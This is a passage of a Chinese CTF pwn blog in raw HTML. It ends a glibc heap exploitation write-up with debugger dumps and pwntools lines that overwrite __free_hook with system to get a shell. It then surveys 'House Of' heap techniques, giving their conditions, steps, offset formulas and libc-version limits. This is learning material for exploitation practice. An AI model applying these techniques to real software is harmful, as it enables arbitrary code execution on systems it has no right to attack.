<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x558b1cfcd0e0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">tcachebins</span><br><span class="line"><span class="number">0x40</span> [  <span class="number">2</span>]: <span class="number">0x558b1cfcd0b0</span> ◂— <span class="number">0x7fef51cc13cd</span></span><br><span class="line"><span class="number">0x50</span> [  <span class="number">1</span>]: <span class="number">0x558b1cfcd060</span> ◂— <span class="number">0x1f1</span> <span class="comment">// delete(后面有大用处)</span></span><br><span class="line"><span class="number">0x60</span> [  <span class="number">1</span>]: <span class="number">0x7fea097ddc00</span> (main_arena+<span class="number">96</span>) ◂— <span class="number">0x558ce25c44cd</span></span><br><span class="line"><span class="number">0x70</span> [  <span class="number">0</span>]: <span class="number">0x7fea097ddc00</span> (main_arena+<span class="number">96</span>) ◂— ...</span><br><span class="line"><span class="number">0x80</span> [  <span class="number">0</span>]: <span class="number">0x558b1cfcd</span></span><br><span class="line"><span class="number">0x260</span> [ <span class="number">81</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x2a0</span> [<span class="number">52796</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x2b0</span> [<span class="number">22705</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x2c0</span> [  <span class="number">5</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x2e0</span> [<span class="number">53264</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x2f0</span> [<span class="number">7420</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x300</span> [<span class="number">21899</span>]: <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x558b1cfcd0a0</span> —▸ <span class="number">0x7fea097ddc00</span> (main_arena+<span class="number">96</span>) ◂— <span class="number">0x558b1cfcd0a0</span></span><br></pre></td></tr></table></figure>
<p>这一块需要先学习 tcache_perthread_struct 结构</p>
<p>下面一段代码需要把两个“add”分开进行理解：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x38</span>, p16(<span class="built_in">stdout</span>))</span><br><span class="line">add(<span class="number">0x58</span>, p64(<span class="number">0xfdad2887</span> | <span class="number">0x1000</span>) + p64(<span class="number">0</span>)*<span class="number">3</span> + b<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">libc.address = u64(p.recv(<span class="number">8</span>)) - <span class="number">0x84</span> - libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br><span class="line"><span class="built_in">log</span>.success(<span class="string">&quot;libc address is &#123;&#125;&quot;</span>.format(hex(libc.address)))</span><br></pre></td></tr></table></figure>
<p>第一次申请后：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">tcachebins</span><br><span class="line"><span class="number">0x40</span> [  <span class="number">1</span>]: <span class="number">0x7f465c72d9cf</span></span><br><span class="line"><span class="number">0x50</span> [  <span class="number">1</span>]: <span class="number">0x55aa705cf060</span> ◂— <span class="number">0x1f1</span></span><br><span class="line"><span class="number">0x60</span> [  <span class="number">1</span>]: <span class="number">0x7f4306d5a6c0</span> (_nl_C_LC_CTYPE+<span class="number">64</span>) ◂— <span class="number">0x7f44f2e09f9a</span> </span><br><span class="line">    <span class="comment">// 这里将有1/16的概率为 _IO_2_1_stdout_</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>xg <span class="number">0x55aa705cf000</span></span><br><span class="line"><span class="number">0x55aa705cf000</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000051</span></span><br><span class="line"><span class="number">0x55aa705cf010</span>:	<span class="number">0x0001000100000000</span>	<span class="number">0x0000000000000001</span></span><br><span class="line"><span class="number">0x55aa705cf020</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55aa705cf030</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55aa705cf040</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55aa705cf050</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000051</span></span><br><span class="line"><span class="number">0x55aa705cf060</span>:	<span class="number">0x000000055aa7043e</span>	<span class="number">0x000055aa705cf010</span></span><br><span class="line"><span class="number">0x55aa705cf070</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55aa705cf080</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55aa705cf090</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55aa705cf0a0</span>:	<span class="number">0x00007f465c72d9cf</span>	<span class="number">0x000055aa705cf060</span> <span class="comment">// &#x27;0x40&#x27;的tcache</span></span><br><span class="line"><span class="number">0x55aa705cf0b0</span>:	<span class="number">0x00007f4306d5a6c0</span>	<span class="number">0x0000000000000000</span> <span class="comment">// &#x27;0x60&#x27;的tcache(已覆盖)</span></span><br><span class="line"><span class="number">0x55aa705cf0c0</span>:	<span class="number">0x000000055aa705cf</span>	<span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>
<p>这次申请的是“0x40的tcache”（写有“0x60的tcache”），输入的是“0x60的tcache”的位置，下一次如果申请的大小为“0x60”就会把“覆盖后的main_arena”申请出来，进行一次写入</p>
<p>第二次申请，就进行了 IO_2_1_stdout leak，通过修改 <code>_IO_2_1_stdout_</code> 的 flag 值，然后当程序调用 puts 输出任意信息时，就会输出 <code>_IO_write_base</code> 到 <code>_IO_write_ptr</code> 之间的数据</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x48</span>, b<span class="string">&quot;\x00&quot;</span>*<span class="number">0x40</span> + p64(libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>] - <span class="number">0x10</span>))</span><br><span class="line">add(<span class="number">0x38</span>, b<span class="string">&quot;/bin/sh\x00&quot;</span>.ljust(<span class="number">0x10</span>) + p64(libc.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line"><span class="keyword">delete</span>()</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">tcachebins</span><br><span class="line"><span class="number">0x40</span> [  <span class="number">1</span>]: <span class="number">0x7f3e3391980a</span> <span class="comment">// 可以继续覆盖为&quot;free_hook&quot;</span></span><br><span class="line"><span class="number">0x50</span> [  <span class="number">1</span>]: <span class="number">0x561aa040a060</span> ◂— <span class="number">0x1f1</span></span><br><span class="line"><span class="number">0x60</span> [  <span class="number">0</span>]: <span class="number">0x708180b3d</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>xg <span class="number">0x561aa040a050</span></span><br><span class="line"><span class="number">0x561aa040a050</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000051</span></span><br><span class="line"><span class="number">0x561aa040a060</span>:	<span class="number">0x0000000561aa05fb</span>	<span class="number">0x0000561aa040a010</span> <span class="comment">// will be malloc</span></span><br><span class="line"><span class="number">0x561aa040a070</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x561aa040a080</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x561aa040a090</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x561aa040a0a0</span>:	<span class="number">0x00007f3e3391980a</span>	<span class="number">0x0000561aa040a060</span> <span class="comment">// &#x27;0x40&#x27;的tcache</span></span><br><span class="line"><span class="number">0x561aa040a0b0</span>:	<span class="number">0x0000000708180b3d</span>	<span class="number">0x0000000000000000</span> <span class="comment">// &#x27;0x60&#x27;的tcache</span></span><br><span class="line"><span class="number">0x561aa040a0c0</span>:	<span class="number">0x0000000561aa040a</span>	<span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>
<p>和上面思路一样，打了 free_hook 就结束了（这个heap排列真的值得我学习）</p>
<hr>
<p><strong>小结：</strong></p>
<p>本题目融合了 tcache perthread corruption，house of roman，IO_2_1_stdout leak，难度有明显上升，因为我之前复现了一道 house of roman 和 IO_2_1_stdout leak 结合的题目，所以爆破这部分比较顺畅</p>
<p>此题目大大加强了我对 tcache 的理解（主要是对“tcache_perthread_struct”的理解），还体验了一波 tcache perthread corruption（刚学tcache时，觉得它的检查很少很简单，现在觉得它的利用也挺麻烦的）</p>
<p>我还学习到了大佬的思路，说实话，大佬对于覆写“tcache_entry”的处理真的让我大开眼界，他对于 unsortedbin 的切割很是讲究，使 main_arena 刚好可以被控制，并且后面“申请tcache”和“覆写main_arena”的配合也是研究过的，没有出现“无main_arena可用”的尴尬（对于 heap 排列，我还是要多多“试错”）</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/13/House%20Of%20%E7%B3%BB%E5%88%97/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/03/13/House%20Of%20%E7%B3%BB%E5%88%97/" class="post-title-link" itemprop="url">House Of 系列（持续更新）</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-03-13 15:35:22 / Modified: 15:40:28" itemprop="dateCreated datePublished" datetime="2022-03-13T15:35:22+08:00">2022-03-13</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/HouseOfSeries/" itemprop="url" rel="index"><span itemprop="name">HouseOfSeries</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>5.5k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>5 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="House-Of-Spirit"><a href="#House-Of-Spirit" class="headerlink" title="House Of Spirit"></a>House Of Spirit</h2><p>House Of Spirit 是一种 fastbin attack ，通过利用 free 函数来释放一个 fake chunk，将地址 free 到堆的 bin 链中，然后实现对栈地址的读写实现WAA</p>
<p><strong>保护检查</strong></p>
<ul>
<li>fake chunk 的 ISMMAP 位不能为 1，因为 free 时，如果是 mmap 的 chunk，会单独处理</li>
<li>fake chunk 地址需要对齐， MALLOC_ALIGN_MASK</li>
<li>fake chunk 的 size 大小需要满足对应的 fastbin 的需求，同时也得对齐</li>
<li>fake chunk 的 next chunk 的大小不能小于 <code>2 * SIZE_SZ</code>，同时也不能大于<code>av-&gt;system_mem</code></li>
<li>fake chunk 对应的 fastbin 链表头部不能是该 fake chunk，即不能构成 double free 的情况</li>
</ul>
<p>主要是：当前chunk的size（chunk-&gt;size），和下一个chunk的size（nextchunk-&gt;size）</p>
<p><strong>利用条件</strong></p>
<ul>
<li>可以控制 free 的参数，把它改为 fake chunk data addr（House Of Spirit的核心）</li>
<li>可以控制 fake chunk 的 size</li>
<li>可以控制 next chunk 的 size（程序会根据 fake chunk-&gt;size 来获取 next chunk 的位置）</li>
</ul>
<p><strong>利用姿势</strong></p>
<p>现成了两种风格：</p>
<ul>
<li>释放栈中的 fake chunk，劫持 ret 返回地址（利用栈溢出覆盖free的参数）</li>
<li>释放堆中的 fake chunk，劫持控制模块实现WAA（需要注意chunk结构和off-by-one）</li>
</ul>
<p>小技巧：</p>
<ul>
<li>一定要多多关注“可控区域”里的“数字”</li>
<li>注意一些“计数器”</li>
</ul>
<p>用这些现成的“数字”充当 nextchunk-&gt;size 或者 chunk-&gt;size</p>
<p><strong>版本影响</strong></p>
<p>libc-2.23：基础检查</p>
<p>libc-2.27：多了一个检查，nextchunk-&gt;presize 不为 0（注意 tcache 的影响）</p>
<hr>
<h2 id="House-Of-Force"><a href="#House-Of-Force" class="headerlink" title="House Of Force"></a>House Of Force</h2><p>house of force 是修改 top chunk size 的一种利用方法 ，利用 top chunk 分割中的漏洞来申请任意 chunk，再通过修改模块进行 GOT劫持，hook劫持</p>
<p>假设这个时候的 top_chunk=0x601200，然后 malloc(0xffe00020)，然后对 malloc 申请的 size 进行检查，<code>0xffe00030 &lt; top_chunk_size</code> ，所以可以成功malloc内存，然后计算top_chunk的新地址：<code>0xffe00030+0x601200=0x100401230</code>, 因为是x86环境，最高位溢出了，所以<code>top_chunk=0x401230</code></p>
<p>然后下次我们再malloc的时候，返回的地址就是<code>0x401238</code></p>
<p><strong>保护检查</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE)) </span><br></pre></td></tr></table></figure>
<p>只有 top chunk 的 size 大于等于申请的 size，才会有后续操作</p>
<p><strong>利用条件</strong></p>
<ul>
<li>用户能够篡改 top chunk 的 size 字段（篡改为负数或很大值）</li>
<li>用户可以申请任意大小的堆内存（包括负数）</li>
<li>堆溢出，用于修改 top chunk-&gt;size</li>
</ul>
<p><strong>利用姿势</strong></p>
<ul>
<li>通过堆溢出将 top chunk 的 size 字段篡改成 -1（size 就变成了无符号整数中最大的值）</li>
<li>计算偏移，申请大小为该偏移的chunk，把 top chunk 分割到可以修改的目标地址</li>
</ul>
<p>以下公式可以用来计算偏移：（有时 offse 有偏差也可以进行修正）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">offset = target_addr - (top_chunk_addr + <span class="number">0x8</span>) <span class="comment"># 64位就改为&quot;+0x10&quot;</span></span><br><span class="line"><span class="comment"># target_addr：目标地址</span></span><br><span class="line"><span class="comment"># top_chunk_addr：top chunk起始地址</span></span><br></pre></td></tr></table></figure>
<p>注意：offset 通常为负</p>
<p><strong>版本影响</strong></p>
<p>libc-2.23：基础检查，可以通过</p>
<p>libc-2.27：在检查中给chunk添加了一个“范围”（min_address &amp; max_address），限制了申请chunk的地址范围，这样就导致 top chunk 无法分割到目标地址了，House Of Force 失效</p>
<hr>
<h2 id="House-Of-Einherjar"><a href="#House-Of-Einherjar" class="headerlink" title="House Of Einherjar"></a>House Of Einherjar</h2><p>house of einherjar 跟 house of force 差不多，最终目的都是控制 top chunk 的值，该技术可以强制使得<code>malloc</code>返回一个几乎任意地址的 chunk</p>
<p>通过 off-by-one 把最后一个 chunk 的 pre_inuse 标志位置零，让 free 函数以为上一个 chunk 已经被 free，就会进行后向合并，根据 last chunk-&gt;fake presize 把 top chunk 合并到目标区域</p>
<p>然后下次我们再malloc的时候，返回的地址就是目标地址</p>
<p><strong>保护检查</strong></p>
<p>Unlink 的检测：检查 <strong>“fake chunk-&gt;size”</strong> （必须可以通过 size 索引到“last chunk”，并且P位为“0”，这样才会进行 unlink），因为“fake_size”（offset）很大，fake chunk 会被当做是 large chunk ，所以还会格外检查 <strong>FD，BK，FDsize，BKsize</strong> </p>
<p><strong>利用条件</strong></p>
<ul>
<li>用户能够篡改 top chunk 的 presize 字段（篡改为负数或很大值）</li>
<li>有 off-by-one ，可以覆盖 last chunk 的P位为“\x00”（使其在和 top chunk 合并后还可以进行后向合并，通过“chunk-&gt;presize”索引到“fake chunk”把 top chunk 合并到“fake chunk”上）</li>
<li>可以控制“fake chunk”</li>
</ul>
<p><strong>利用姿势</strong></p>
<ul>
<li>已有两个 chunk（最后一个chunk，和倒数第二个chunk）</li>
<li>在倒数第二个 chunk 的最后一片内存空间（lastchunk-&gt;presize）中写入 offset（可以索引到 fakechunk），同时溢出“\x00”覆盖 lastchunk 的P位（lastchunk-&gt;size）</li>
<li>提前在 fake chunk 处伪造好数据：presize（offset），size，FD，BK，FDsize，BKsize</li>
<li>释放 lastchunk，这样 top chunk 就会转移到该地址</li>
</ul>
<p>以下公式可以用来计算偏移 presize：（有时 offse 有偏差也可以进行修正）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">offset = lastchunk_addr - target_addr</span><br><span class="line"><span class="comment"># target_addr：目标地址</span></span><br><span class="line"><span class="comment"># lastchunk_addr：last chunk起始地址</span></span><br></pre></td></tr></table></figure>
<p>小技巧：</p>
<ul>
<li>控制“fake chunk”，写入“fake_size”，在“FD，BK，FDsize，BKsize”中都写入“fake chunk addr”（target_addr）就可以通过检查（至少在 libc-2.23 是这样的）</li>
</ul>
<p><strong>版本影响</strong></p>
<p>libc-2.23：基本没有影响，可以通过</p>
<p>libc-2.27：Unlink 对 presize 的检查更为严格了，导致 House Of Einherjar 失效</p>
<hr>
<h2 id="House-Of-Lore"><a href="#House-Of-Lore" class="headerlink" title="House Of Lore"></a>House Of Lore</h2><p>House of Lore 攻击与 Glibc 堆管理中的 Small Bin 的机制紧密相关</p>
<p>它的利用面很小，很容易被其他攻击技术取代</p>
<ul>
<li>House of Lore 可以实现 <strong>分配</strong> 任意指定位置的 chunk，从而修改任意地址的内存</li>
<li>House of Lore 利用的前提是需要控制 Small Bin Chunk 的bk指针，并且控制指定位置 chunk 的fd指针</li>
</ul>
<p><strong>保护检查</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br></pre></td></tr></table></figure>
<p>检查 fakechunk-&gt;FD 是不是 victim_chunk</p>
<p><strong>利用条件</strong></p>
<ul>
<li>可以构造 small bins（一般程序会用 fastbin，unsortedbin，tcache 很少用smallbin，largebin）</li>
<li>程序可修改 small bins 中 free chunk 的 bk 指针</li>
<li>对应伪造 fake chunk 的区域有一定控制权（可以伪造 fakechunk-&gt;FD 为 victim_chunk）</li>
</ul>
<p><strong>利用姿势</strong></p>
<ul>
<li>首先申请了一个在 fastbin 范围内的 victim chunk，然后再在栈上构造了一个 fake chunk（fake chunk 为 stack_buffer_1，还需要一个 stack_buffer_2 来打掩护）</li>
<li>为了绕过检测，设置 stack_buffer_1 的 BK 指针指向 stack_buffer_2，设置 stack_buffer_2 的 FD 指针指向 stack_buffer_1</li>
<li>接下来先 malloc 一个chunk，防止 free 之后与 top chunk 合并，然后 free 掉 victim，这时候 victim 会被放到 fastbin 中  </li>
<li>接下来再去 malloc 一个 large chunk，会触发 fastbin 的合并，然后放到 unsorted bin 中，这样我们的 victim chunk 就放到了 unsorted bin 中，然后最终被 unsorted bin 分配到 small bin 中</li>
<li>在 victim chunk 的BK指针中写入fake chunk（small bin是基于BK，从后向前申请的）</li>
<li>再次申请 victim chunk（同时 fake chunk 进入small bin），最后申请 fake chunk </li>
</ul>
<p><strong>版本影响</strong></p>
<p>libc-2.23：基础检查，可以通过</p>
<p>libc-2.27：基础检查，还需要绕过 cache</p>
<p>libc-2.31：House Of Lore 已经失效</p>
<hr>
<h2 id="House-Of-Orange"><a href="#House-Of-Orange" class="headerlink" title="House Of Orange"></a>House Of Orange</h2><p>House Of Orange 核心就是通过漏洞利用获得 free 的效果 </p>
<p>这种操作的原理简单来说是当前堆的 top chunk 尺寸不足以满足申请分配的大小的时候，原来的 top chunk 会被释放并被置入 unsorted bin 中，通过这一点可以在没有 free 函数情况下获取到 unsorted bins</p>
<p>后续可以配合 unsorted bin attack 和 FSOP 获取 shell</p>
<p><strong>利用条件</strong></p>
<ul>
<li>有堆溢出，可以修改 top chunk size</li>
<li>可以申请较大的空间</li>
<li>没有释放模块（看见程序没有 free，realloc等函数时，优先考虑打House Of Orange）</li>
</ul>
<p>伪造的 top chunk size 的要求 ：</p>
<ul>
<li>0x0fe1、0x1fe1、0x2fe1、0x3fe</li>
</ul>
<p><strong>利用姿势</strong></p>
<ul>
<li>通过堆溢出修改 top chunk size为“0x0fe1”</li>
<li>申请“0x2000”的空间</li>
</ul>
<p><strong>版本影响</strong></p>
<p>libc-2.23：可用打通</p>
<p>libc-2.24：增加了 vtable check，但仍然可以绕过</p>
<p>libc-2.27：完全失效</p>
<hr>
<h2 id="House-Of-Rabbit"><a href="#House-Of-Rabbit" class="headerlink" title="House Of Rabbit"></a>House Of Rabbit</h2><p>House Of Rabbit 是一种伪造堆块的技术，一般运用在 fastbin attack 中</p>
<ul>
<li>缺点：条件过多并且有替代选项（unlink攻击，Double free等等）</li>
<li>优点：对 libc 版本的“抵抗力”很强，高 libc 版本也可以打</li>
</ul>
<p>核心：利用 fastbin consolidate 使 fastbin 中的 fake chunk 合法化</p>
<p><strong>利用条件</strong></p>
<ul>
<li>修改fastbin chunk的大小（感觉和unlink条件差不多，效果也差不多）<ul>
<li>堆溢出（有时off-by-one也利用），可以覆盖 nextchunk-&gt;size</li>
<li>可以申请足够大小的 chunk</li>
<li>可以控制 free 的参数</li>
</ul>
</li>
<li>修改FD指针（这种情况不用考虑，因为可以打 Double free，除非特殊情况）<ul>
<li>有修改模块，并且有UAF（可以修改 free chunk）</li>
<li>可以申请足够大小的 chunk</li>
<li>可以控制 free 的参数</li>
</ul>
</li>
</ul>
<p><strong>利用姿势</strong></p>
<ul>
<li>修改fastbin chunk的大小：直接构造 overlap chunk，通过 fastbin consolidate 使其合法化</li>
<li>修改FD指针：让 chunk-&gt;FD 指向一个 fake chunk，触发 fastbin consolidate 之后让这个 fake chunk 成为一个合法的 chunk（注意一下fake chunk的排列，不然会在consolidate时报错）</li>
</ul>
<p><strong>版本影响</strong></p>
<p>经测试：libc-2.23 ~ libc-2.31 都可以打通</p>
<hr>
<h2 id="House-Of-Roman"><a href="#House-Of-Roman" class="headerlink" title="House Of Roman"></a>House Of Roman</h2><p>House of Roman 的一个核心思路就是利用 <strong>局部写</strong> 减少随机化的程度，从而给出爆破的可能</p>
<p>这种利用手法的主要特点是不需要 <code>leak libc</code>的地址，用于 bypass ALSR，利用 12-bit 的爆破来达到获取 shell 的目的，且仅仅只需要一个 UAF 漏洞以及能创建任意大小的 chunk 的情况下，就能完成利用（当然也可以来绕 PIE）</p>
<p>当程序没法泄露 libc_base 时，就会优先考虑 House Of Roman</p>
<p><strong>利用条件</strong></p>
<ul>
<li>UAF（对 fastbin 中的“main_arena+xx”进行修改，使其指向目标地址）</li>
<li>off-by-one（覆写“size”的大小，为了使保留有“main_arena+xx”进入fastbin）</li>
</ul>
<p><strong>利用姿势</strong></p>
<ul>
<li>利用 off-by-one 把原本不可能进入 fastbin 的 unsorted chunk 进行修改（修改 size 到 fastbin 的范围），使遗留有“main_arena+xx”的chunk进入 fastbin</li>
<li>利用 UAF 修改遗留在 fast chunk 中的“main_arena+xx”，使其指向目标地址</li>
</ul>
<p><strong>版本影响</strong></p>
<p>House Of Roman 并不依赖于 libc 源码，它的思想完全可以独立使用（覆盖main_arena）</p>
<p>但是实现 House Of Roman 需要 fastbin attack，unsortedbin attack 等技术的配合，而它们会受 libc 版本影响：</p>
<p>libc-2.27：</p>
<ul>
<li>fastbin attack 需要绕 tache（对chunk的数量有要求）</li>
<li>unsortedbin attack 可以直接打（只检查了“victim-&gt;size”，形同虚设）</li>
</ul>
<p>libc-2.29：</p>
<ul>
<li>fastbin attack 需要绕 tache（对chunk的数量有要求）</li>
<li>unsortedbin attack 失效（其实也有办法可以绕过，只是条件苛刻）</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/13/House%20Of%20Roman-%E5%8E%9F%E7%90%86/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/03/13/House%20Of%20Roman-%E5%8E%9F%E7%90%86/" class="post-title-link" itemprop="url">House Of Roman-原理</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-03-13 15:20:46" itemprop="dateCreated datePublished" datetime="2022-03-13T15:20:46+08:00">2022-03-13</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-04-06 14:42:24" itemprop="dateModified" datetime="2022-04-06T14:42:24+08:00">2022-04-06</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/HouseOfSeries/" itemprop="url" rel="index"><span itemprop="name">HouseOfSeries</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>4.2k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>4 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="House-Of-Roman"><a href="#House-Of-Roman" class="headerlink" title="House Of Roman"></a>House Of Roman</h2><p>House of Roman 的一个核心思路就是利用 <strong>局部写</strong> 减少随机化的程度，从而给出爆破的可能</p>
<p>这种利用手法的主要特点是不需要 <code>leak libc</code>的地址，用于 bypass ALSR，利用 12-bit 的爆破来达到获取 shell 的目的，且仅仅只需要一个 UAF 漏洞以及能创建任意大小的 chunk 的情况下，就能完成利用（当然也可以来绕 PIE）</p>
<ul>
<li>利用 off-by-one 把原本不可能进入 fastbin 的 unsorted chunk 进行修改（修改 size 到 fastbin 的范围），使遗留有“main_arena+xx”的chunk进入 fastbin</li>
<li>利用 UAF 修改遗留在 fast chunk 中的“main_arena+xx”，使其指向目标地址</li>
</ul>
<hr>
<h2 id="House-Of-Roman-利用姿势"><a href="#House-Of-Roman-利用姿势" class="headerlink" title="House Of Roman 利用姿势"></a>House Of Roman 利用姿势</h2><p><strong>外国老哥给了一个 demo：</strong></p>
